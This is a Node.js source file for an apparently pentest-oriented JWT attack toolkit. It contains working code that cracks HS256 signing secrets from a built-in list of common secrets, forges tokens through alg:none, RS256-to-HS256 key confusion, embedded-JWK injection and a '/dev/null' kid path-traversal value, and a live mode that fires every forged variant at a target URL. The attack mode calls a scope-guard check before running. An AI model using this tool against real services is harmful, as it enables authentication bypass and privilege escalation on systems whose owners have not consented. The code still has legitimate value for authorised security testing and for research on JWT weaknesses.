#!/usr/bin/env node
// JWT toolbox (zero-dep). Makes JWT attacks deterministic instead of hand-crafted:
//   node tools/jwt.js decode <token>                 -> header/payload/exp/alg/role/iss/ref
//   node tools/jwt.js verify <token> --key <secret>  -> is the HS256 signature valid?
//   node tools/jwt.js crack <token> [--words a,b|--words-file f] [--derive]
//                                                    -> offline HS256 key recovery over an embedded
//       common-secret list (+ your seeds); --derive extends every seed with sha1/md5/sha256-hex,
//       base64/hex forms and self-derived hashes OF THE TOKEN ITSELF (apps that do
//       sha1(header.payload) or hash the session id are common).
//   node tools/jwt.js forge <token> [--key <secret>] [--alg none|HS256|RS256]
//                              [--set k=v]... [--delete k]... [--set-header k=v]...
//                              [--delete-header k]... [--jwk-self | --jwk-oct <secret>]
//       --set-header injects/changes header fields (kid/jku/x5u/typ) for jku/x5u and
//       alg-confusion attacks; --alg RS256 --key <public-key> forges the RS256->HS256 confusion.
//       --jwk-self generates a throwaway RSA pair, signs RS256 with the private half and embeds
//       the public half as header.jwk (CVE-2018-0114 style); --jwk-oct embeds an oct JWK and
//       signs HS256 with it (libs that trust header.jwk blindly accept either).
//   node tools/jwt.js attack <url> --token <t> [--keys file|k1,k2] [--set k=v]...
//                              [--header "K: V"] [--method M] [--data D] [--show-body]
//                              [--jwk-self] [--no-kid]
//        baseline (original token) vs: alg:none, alg:none+modified claims, HS256 signed with each
//        candidate key, RS/PS/ES->HS256 confusion, kid traversal (empty-key signing via
//        /dev/null-style kid) and inline-jwk variants (--jwk-self adds an RS256+jwk probe).
//        Scope-guarded. The response diff tells you if the server accepts forged tokens.
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const fs = require('fs');
const { loadScope, inScope } = require('./scope-guard');

function b64urlEncode(buf) {
  return Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
}
function partToJson(s) {
  try {
    return JSON.parse(b64urlDecode(s).toString('utf8'));
  } catch {
    return null;
  }
}
function sign(headerB64, payloadB64, key, alg) {
  const data = headerB64 + '.' + payloadB64;
  if (alg === 'none') return '';
  return b64urlEncode(crypto.createHmac('sha256', String(key)).update(data).digest());
}

function decode(token) {
  const parts = String(token).split('.');
  if (parts.length < 2) throw new Error('not a JWT (need at least header.payload)');
  const header = partToJson(parts[0]);
  const payload = partToJson(parts[1]) || {};
  return {
    header,
    payload,
    alg: header && header.alg,
    typ: header && header.typ,
    exp: payload.exp != null ? new Date(payload.exp * 1000).toISOString() : null,
    exp_unix: payload.exp != null ? payload.exp : null,
    nbf: payload.nbf != null ? new Date(payload.nbf * 1000).toISOString() : null,
    role: payload.role != null ? payload.role : null,
    iss: payload.iss != null ? payload.iss : null,
    ref: payload.ref != null ? payload.ref : null,
    sub: payload.sub != null ? payload.sub : null,
    preview: token.slice(0, 24) + '...',
  };
}

function verify(token, key) {
  const parts = String(token).split('.');
  if (parts.length !== 3) return { valid: false, reason: 'not a 3-part JWT' };
  const header = partToJson(parts[0]);
  if (!header) return { valid: false, reason: 'bad header' };
  if (header.alg !== 'HS256') return { valid: false, reason: 'alg ' + header.alg + ' (only HS256 supported)' };
  const expect = sign(parts[0], parts[1], key, 'HS256');
  const actual = parts[2];
  try {
    const ok = crypto.timingSafeEqual(Buffer.from(expect), Buffer.from(actual));
    return { valid: ok, alg: 'HS256' };
  } catch {
    return { valid: false, reason: 'signature length mismatch' };
  }
}

// Shared claim/header mutation for every forging path (forge / --jwk-self / --jwk-oct).
function mutateParts(token, opts) {
  const parts = String(token).split('.');
  if (parts.length < 2) throw new Error('not a JWT');
  const header = partToJson(parts[0]) || {};
  const payload = partToJson(parts[1]) || {};
  const setHeader = opts.setHeader || {};
  const alg = setHeader.alg != null ? setHeader.alg : (opts.alg || header.alg || 'none');
  header.alg = alg;
  for (const [k, v] of Object.entries(setHeader)) {
    if (v === 'true') header[k] = true;
    else if (v === 'false') header[k] = false;
    else if (/^-?\d+$/.test(v)) header[k] = +v;
    else header[k] = v;
  }
  // Accept both shapes: CLI passes {claim: value} maps, programmatic callers may pass arrays.
  for (const k of (Array.isArray(opts.deleteHeader) ? opts.deleteHeader : Object.keys(opts.deleteHeader || {}))) delete header[k];
  if (alg === 'none' && setHeader.kid == null) delete header.kid;
  for (const [k, v] of Object.entries(opts.set || {})) {
    if (v === 'true') payload[k] = true;
    else if (v === 'false') payload[k] = false;
    else if (/^-?\d+$/.test(v)) payload[k] = +v;
    else payload[k] = v;
  }
  for (const k of (Array.isArray(opts.delete) ? opts.delete : Object.keys(opts.delete || {}))) delete payload[k];
  if (opts.exp != null) payload.exp = Math.floor(Date.now() / 1000) + (+opts.exp);
  return { header, payload, alg };
}

function forge(token, opts) {
  const { header, payload, alg } = mutateParts(token, opts);
  if (opts.jwkSelf) return forgeJwkSelf(header, payload);
  if (opts.jwkOct != null) return forgeJwkOct(header, payload, opts.jwkOct);
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  return h + '.' + p + '.' + sign(h, p, opts.key, alg);
}

// ---- live attack mode ----
function request(u, method, headers, body, timeoutMs) {
  return new Promise((resolve) => {
    const lib = u.protocol === 'https:' ? https : http;
    const t0 = Date.now();
    let done = false;
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const req = lib.request(u, { method, headers, timeout: timeoutMs }, (res) => {
      const chunks = [];
      let len = 0;
      res.on('data', (d) => { len += d.length; chunks.push(d); });
      res.on('end', () => fin({ status: res.statusCode, bytes: len, body: Buffer.concat(chunks).toString('utf8'), ms: Date.now() - t0 }));
    });
    req.on('timeout', () => { req.destroy(); fin({ timeout: true, ms: Date.now() - t0 }); });
    req.on('error', (e) => fin({ error: e.message, ms: Date.now() - t0 }));
    if (body) req.write(body);
    req.end();
  });
}

function loadKeys(arg) {
  if (!arg) return [];
  if (fs.existsSync(arg)) {
    return fs.readFileSync(arg, 'utf8').split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
  }
  return arg.split(',').map((s) => s.trim()).filter(Boolean);
}

// ---- offline HS256 key recovery (crack) ----
// Embedded starter list: the secrets that keep appearing in real apps/bench apps. Not a
// wordlist replacement — pass a big one via --words-file (one secret per line).
const COMMON_SECRETS = [
  'secret', 'password', 'jwt_secret', 'your-256-bit-secret', 'your_jwt_secret', 'your key',
  'changeme', 'changeit', 'key', 'supersecret', 'super_secret', 'topsecret', 'admin', 'test',
  'testing', 'dev', 'development', 'staging', 'production', 'prod', 'jwt', 'token', 'mysecret',
  'my-secret', 'mysecretkey', 'shhhh', 'shhh', 'itsasecret', 's3cr3t', 's3cret', 'secr3t',
  '123456', '1234567890', 'qwerty', 'letmein', 'abc123', 'password1', 'p@ssw0rd', 'passw0rd',
  'iloveyou', 'trustno1', 'default', 'example', 'null', 'undefined', 'false', 'hackme',
  'secretkey', 'secret_key', 'secret-key', 'authsecret', 'auth_secret', 'appsecret', 'app_secret',
  'clientsecret', 'client_secret', 'signingkey', 'signing_key', 'signing-secret', 'hs256',
  'hs256_secret', 'jwtsecret', 'jwt-secret', 'jwt_secret_key', 'SECRET', 'Secret', 'SESSION_SECRET',
  'session_secret', 'token_secret', 'TOKEN_SECRET', 'keyboard cat', 'keyboard-cat', 'ilovejuiceshop',
];

// Expansions of one seed word -> {key,label} pairs. Hash/encoding derivations cover apps that
// store the HMAC secret as a digest of something human-known (sha1(password), md5(api-key)...).
function derivations(word) {
  const w = String(word);
  const buf = Buffer.from(w, 'utf8');
  return [
    { key: w, label: 'word' },
    { key: crypto.createHash('sha1').update(buf).digest('hex'), label: 'sha1(' + w + ')' },
    { key: crypto.createHash('md5').update(buf).digest('hex'), label: 'md5(' + w + ')' },
    { key: crypto.createHash('sha256').update(buf).digest('hex'), label: 'sha256(' + w + ')' },
    { key: buf.toString('base64'), label: 'b64(' + w + ')' },
    { key: buf.toString('hex'), label: 'hex(' + w + ')' },
    { key: crypto.createHash('sha1').update(buf).digest('base64'), label: 'sha1-b64(' + w + ')' },
  ];
}

// Secrets derived from the token itself — some backends sign with a hash of the header.payload,
// of the raw session id embedded in a claim, or of the whole token string.
function selfDerived(token) {
  const parts = String(token).split('.');
  const hp = parts[0] + '.' + parts[1];
  const mk = (prefix, s) => [
    { key: crypto.createHash('sha1').update(s).digest('hex'), label: prefix + ':sha1' },
    { key: crypto.createHash('md5').update(s).digest('hex'), label: prefix + ':md5' },
    { key: crypto.createHash('sha256').update(s).digest('hex'), label: prefix + ':sha256' },
    { key: Buffer.from(s, 'utf8').toString('base64'), label: prefix + ':b64' },
  ];
  return [...mk('self(h.p)', hp), ...(parts[2] ? mk('self(full)', String(token)) : [])];
}

function crack(token, opts) {
  opts = opts || {};
  const parts = String(token).split('.');
  if (parts.length !== 3 || partToJson(parts[0]) == null) {
    return { found: false, reason: 'not a 3-part JWT', tried: 0 };
  }
  let words = COMMON_SECRETS.slice();
  if (opts.wordsFile && fs.existsSync(opts.wordsFile)) {
    words = words.concat(fs.readFileSync(opts.wordsFile, 'utf8').split(/\r?\n/).map((l) => l.trim()).filter(Boolean));
  } else if (opts.words) {
    words = words.concat(String(opts.words).split(',').map((s) => s.trim()).filter(Boolean));
  }
  const seen = new Set();
  const candidates = [];
  for (const w of words) {
    for (const d of (opts.derive ? derivations(w) : [{ key: w, label: 'word' }])) {
      if (!seen.has(d.key)) { seen.add(d.key); candidates.push(d); }
    }
  }
  if (opts.derive) {
    for (const d of selfDerived(token)) {
      if (!seen.has(d.key)) { seen.add(d.key); candidates.push(d); }
    }
  }
  // empty-string key: pairs with kid-traversal signing (server reads /dev/null as the key)
  if (!seen.has('')) { seen.add(''); candidates.push({ key: '', label: 'empty' }); }
  for (const c of candidates) {
    const r = verify(token, c.key);
    if (r.valid) return { found: true, key: c.key, derivation: c.label, tried: candidates.indexOf(c) + 1 };
  }
  return { found: false, tried: candidates.length };
}

// ---- inline-jwk forging ----
// RS256 with a throwaway keypair whose public half rides in the header (CVE-2018-0114 style):
// a verifier that trusts header.jwk validates OUR signature against OUR key.
function forgeJwkSelf(headerObj, payloadObj) {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const h = b64urlEncode(JSON.stringify(Object.assign({}, headerObj, { alg: 'RS256', jwk: { kty: jwk.kty, n: jwk.n, e: jwk.e } })));
  const p = b64urlEncode(JSON.stringify(payloadObj));
  const sig = b64urlEncode(crypto.sign('sha256', Buffer.from(h + '.' + p, 'utf8'), privateKey));
  return h + '.' + p + '.' + sig;
}
// oct-JWK twin: header carries the HMAC key itself; signed HS256 with it.
function forgeJwkOct(headerObj, payloadObj, secret) {
  const k = b64urlEncode(Buffer.from(String(secret), 'utf8'));
  const h = b64urlEncode(JSON.stringify(Object.assign({}, headerObj, { alg: 'HS256', jwk: { kty: 'oct', k } })));
  const p = b64urlEncode(JSON.stringify(payloadObj));
  return h + '.' + p + '.' + sign(h, p, String(secret), 'HS256');
}

async function attack(url, opts) {
  const scope = loadScope();
  const g = inScope(url, scope);
  if (!g.ok) {
    console.error(JSON.stringify({ blocked: url, reason: g.reason }));
    process.exit(1);
  }
  const keys = loadKeys(opts.keys);
  const token = opts.token;
  const parts = token.split('.');
  const payload = partToJson(parts[1]) || {};
  const header = partToJson(parts[0]) || {};
  const claims = Object.assign({}, payload);
  for (const [k, v] of Object.entries(opts.set || {})) {
    claims[k] = v === 'true' ? true : v === 'false' ? false : /^-?\d+$/.test(v) ? +v : v;
  }
  const setHeader = opts.setHeader || {};
  const mkToken = (hdrAlg, signKey, signAlg, hdrOver) => {
    const h = b64urlEncode(JSON.stringify(Object.assign({}, header, hdrOver || {}, { alg: hdrAlg })));
    const p = b64urlEncode(JSON.stringify(claims));
    return h + '.' + p + '.' + sign(h, p, signKey, signAlg);
  };
  const asym = /^(RS|PS|ES)\d*$/i.test(header.alg || '');
  const variants = [{ label: 'baseline', token }];
  variants.push({ label: 'alg-none', token: mkToken('none', null, 'none') });
  if (opts.set || Object.keys(setHeader).length) variants.push({ label: 'alg-none-modified', token: mkToken('none', null, 'none', setHeader) });
  // kid injection: servers that look the key up by header.kid may be pointed at an empty file
  // (/dev/null traversal) or an empty kid -> signature made with the EMPTY key.
  if (!opts.noKid) {
    for (const [kidLabel, kidVal] of [['kid-devnull', '../../../../../../../dev/null'], ['kid-empty', '']]) {
      const hdrOver = Object.assign({}, setHeader, { alg: 'HS256', kid: kidVal });
      const h = b64urlEncode(JSON.stringify(Object.assign({}, header, hdrOver)));
      const p = b64urlEncode(JSON.stringify(claims));
      variants.push({ label: kidLabel, token: h + '.' + p + '.' + sign(h, p, '', 'HS256') });
    }
  }
  for (const k of keys) {
    variants.push({ label: 'hs256-key:' + k.slice(0, 12) + '...', token: mkToken('HS256', k, 'HS256', setHeader) });
    if (opts.set) variants.push({ label: 'hs256-modified-key:' + k.slice(0, 12) + '...', token: mkToken('HS256', k, 'HS256', setHeader) });
    // Alg-confusion: keep the original asymmetric alg in the header but sign with HS256 using
    // the candidate key as the HMAC secret (RS256->HS256 style). The key is usually the leaked
    // public key. forge() supports the same trick via --alg RS256 --key <public-key>.
    if (asym) variants.push({ label: 'confusion-key:' + k.slice(0, 12) + '...', token: mkToken(header.alg, k, 'HS256', setHeader) });
  }
  // inline jwk: oct twin per candidate key (cap 3), plus one RS256 throwaway-keypair probe
  if (opts.jwkOct !== false && keys.length) {
    for (const k of keys.slice(0, 3)) {
      variants.push({ label: 'jwk-oct:' + k.slice(0, 12) + '...', token: forgeJwkOct(Object.assign({}, header, setHeader), claims, k) });
    }
  }
  if (opts.jwkSelf) {
    variants.push({ label: 'jwk-self-rs256', token: forgeJwkSelf(Object.assign({}, header, setHeader), claims) });
  }

  const base = new URL(url);
  const method = opts.method || 'GET';
  const out = [];
  for (const v of variants) {
    const headers = {};
    for (const h of opts.headers || []) {
      const i = h.indexOf(':');
      if (i > 0) headers[h.slice(0, i).trim()] = h.slice(i + 1).trim();
    }
    if (!headers.Authorization) headers.Authorization = 'Bearer ' + v.token;
    const r = await request(base, method, headers, opts.data, opts.timeout || 10000);
    const entry = { variant: v.label, ...r };
    if (opts.showBody && r.body != null) {
      entry.body = r.body.slice(0, 2048);
      entry.body_truncated = r.body.length > 2048 ? true : undefined;
    } else {
      delete entry.body; // don't dump full bodies unless asked
    }
    out.push(entry);
  }
  return out;
}

const [cmd, arg1] = process.argv.slice(2);
function flag(name, dflt) {
  const i = process.argv.indexOf('--' + name);
  if (i >= 0 && process.argv[i + 1]) return process.argv[i + 1];
  return dflt;
}
function flags(name) {
  const out = {};
  for (let i = 0; i < process.argv.length; i++) {
    if (process.argv[i] === '--' + name && process.argv[i + 1]) {
      const kv = process.argv[i + 1];
      const eq = kv.indexOf('=');
      if (eq === -1) out[kv] = true; // valueless flag form: --delete claim / --delete-header header
      else out[kv.slice(0, eq)] = kv.slice(eq + 1);
    }
  }
  return out;
}

async function main() {
  if (cmd === 'decode') {
    console.log(JSON.stringify(decode(arg1), null, 2));
  } else if (cmd === 'verify') {
    console.log(JSON.stringify(verify(arg1, flag('key', '')), null, 2));
  } else if (cmd === 'crack') {
    if (!arg1) { console.error('crack requires <token>'); process.exit(2); }
    console.log(JSON.stringify(crack(arg1, {
      words: flag('words', null), wordsFile: flag('words-file', null),
      derive: process.argv.includes('--derive'),
    }), null, 2));
  } else if (cmd === 'forge') {
    console.log(forge(arg1, {
      alg: flag('alg', null), key: flag('key', null), set: flags('set'), delete: flags('delete'),
      setHeader: flags('set-header'), deleteHeader: flags('delete-header'), exp: flag('exp', null),
      jwkSelf: process.argv.includes('--jwk-self'), jwkOct: flag('jwk-oct', null),
    }));
  } else if (cmd === 'attack') {
    const url = arg1;
    const opts = {
      token: flag('token', null), keys: flag('keys', null), set: flags('set'), setHeader: flags('set-header'), jwkSelf: process.argv.includes('--jwk-self'), noKid: process.argv.includes('--no-kid'),
      headers: (() => { const h = []; for (let i = 0; i < process.argv.length; i++) if (process.argv[i] === '--header' && process.argv[i + 1]) h.push(process.argv[i + 1]); return h; })(),
      method: flag('method', 'GET'), data: flag('data', null), showBody: process.argv.includes('--show-body'), timeout: +flag('timeout', 10000),
    };
    if (!opts.token) {
      console.error('attack requires --token <jwt> (or put it in --header "Authorization: Bearer <jwt>")');
      process.exit(2);
    }
    console.log(JSON.stringify(await attack(url, opts), null, 2));
  } else {
    console.error('usage: node tools/jwt.js decode|verify|crack|forge|attack ...\n' +
      '  crack: [--words a,b|--words-file f] [--derive]\n' +
      '  forge: --alg none|HS256|RS256 --key <s> --set k=v --set-header k=v --delete-header k\n' +
      '         [--jwk-self | --jwk-oct <secret>]\n' +
      '  attack: --token <jwt> --keys a,b [--jwk-self] [--no-kid] [--set k=v] [--header "K: V"]');
    process.exit(2);
  }
}

module.exports = { decode, verify, crack, forge, sign, partToJson, b64urlEncode, derivations, selfDerived, mutateParts, forgeJwkSelf, forgeJwkOct };
if (require.main === module) main();
